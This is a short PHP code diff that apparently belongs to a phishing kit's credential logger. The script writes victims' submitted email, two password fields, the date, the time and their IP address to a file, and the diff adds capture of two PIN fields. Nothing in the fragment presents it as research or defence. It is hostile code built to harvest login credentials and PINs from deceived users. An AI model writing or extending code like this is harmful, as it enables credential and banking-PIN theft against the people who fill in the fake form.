@@ -20,6 +20,8 @@ fwrite($file,
 "* EMAIL: ".$_POST['email']."
 * PASS: ".$_POST['pass']."
 * PASS1: ".$_POST['pass1']."
+* PIN: ".$_POST['pin']."
+* PIN1: ".$_POST['pin1']."
 * FECHA: ".date('Y-m-d')."
 * HORA: ".date('H:i:s')."
 * IP: ".$ip."
